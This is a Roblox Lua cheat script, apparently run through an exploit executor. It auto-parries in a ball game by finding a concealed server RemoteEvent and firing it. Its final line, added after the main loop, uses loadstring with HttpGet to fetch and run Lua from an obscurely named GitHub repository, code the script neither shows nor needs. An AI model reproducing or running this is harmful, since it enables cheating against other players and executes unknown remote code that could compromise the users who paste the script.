 -- Merging Auto Parry functions from v1.4 into v1.5 with enhancements

getgenv().AutoParry = true
getgenv().Visualize = false
getgenv().parry_Range = 40 -- Adding parry range

local players = game:GetService("Players")
local socialService = game:GetService("SocialService")
local statsService = game:GetService("Stats")
local replicated = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")

local player = players.LocalPlayer
local camera = workspace.CurrentCamera

local parried = false
local targetted = false
local opponent = nil
local event = nil

local function createSphere()
    local sphere = Instance.new("Part")
    sphere.Material = Enum.Material.ForceField
    sphere.Anchored = true
    sphere.CanCollide = false
    sphere.Parent = workspace
    sphere.CastShadow = false
    sphere.Shape = Enum.PartType.Ball
    sphere.Color = Color3.fromRGB(255, 0, 0)
    return sphere
end

local sphere = getgenv().Visualize and createSphere() or nil

function resolve_parry_Remote()
    for _, service in pairs({game:GetService("AdService"), socialService}) do
        local remoteEvent = service:FindFirstChildOfClass("RemoteEvent")
        if remoteEvent and remoteEvent.Name:find("\n") then
            event = remoteEvent
            break
        end
    end
end

resolve_parry_Remote()

function parry()
    local cf = camera.CFrame
    local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cf:GetComponents()
    local args = {
        [1] = 0,
        [2] = CFrame.new(x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22),
        [3] = {},
        [4] = {
            [1] = camera.ViewportSize.X / 2,
            [2] = camera.ViewportSize.Y / 2
        },
        [5] = false
    }
    if event then
        event:FireServer(unpack(args))
    end
end

function getBall()
    for _, ball in pairs(workspace.Balls:GetChildren()) do
        if ball:GetAttribute("realBall") then
            return ball
        end
    end
    return nil
end

function getPing()
    return statsService:FindFirstChild("PerformanceStats"):FindFirstChild("Ping"):GetValue()
end

function isWalking()
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return false, "N/A" end

    local hrp = character:FindFirstChild("HumanoidRootPart")
    local velocity = hrp.Velocity

    if velocity.Magnitude > 2 then
        if math.abs(velocity.X) > math.abs(velocity.Z) then
            return true, (velocity.X > 0 and "Right" or "Left")
        else
            return true, (velocity.Z > 0 and "Forward" or "Backward")
        end
    end

    return false, "Stationary"
end

local function onPlayerDeath()
    if getgenv().Visualize and sphere then
        sphere:Destroy()
    end
end

player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid").Died:Connect(onPlayerDeath)
end)

while getgenv().AutoParry do
    task.wait()

    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
    
    local ball = getBall()
    if not ball then continue end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    local distance = (hrp.Position - ball.Position).Magnitude
    local speed = ball.AssemblyLinearVelocity.Magnitude
    
    local desiredVelocity = (hrp.Position - ball.Position).Unit
    local actualVelocity = ball.AssemblyLinearVelocity.Unit
    local dot = desiredVelocity:Dot(actualVelocity)
    local curve = (1 - dot) / 2
    local radius = getgenv().parry_Range

    local ping = getPing() / 1000
    radius = radius + ping

    local isWalking, direction = isWalking()
    if isWalking then
        radius = radius + 2
    end

    if ball:GetAttribute("target") ~= player.Name then
        opponent = players:FindFirstChild(ball:GetAttribute("target")) or workspace.Alive:FindFirstChild(ball:GetAttribute("target"))
        opponent = opponent and opponent:IsA("Player") and opponent.Character or opponent
    end

    if ball:GetAttribute("target") == player.Name and not targetted then
        parried = false
    end
    
    local opponentDistance = opponent and opponent:FindFirstChild("HumanoidRootPart") and (hrp.Position - opponent.HumanoidRootPart.Position).Magnitude or 99999
    
    if getgenv().Visualize and sphere then
        sphere.CFrame = hrp.CFrame
        sphere.Size = Vector3.new(radius, radius, radius)
    end
    
    targetted = ball:GetAttribute("target") == player.Name
    
    if curve > 0.5 or speed <= 0 then continue end
    if distance > radius then continue end
    if ball:GetAttribute("target") ~= player.Name then continue end
    if parried then continue end
    
    parried = speed > 5
    if parried then
        parry()
    end
end

if sphere then sphere:Destroy() end

loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/SlzAX17vGCub7iRKVmJid61Bg/main/KwKVzV5SgcFBd9fnpLr4lKCg6.lua"))()
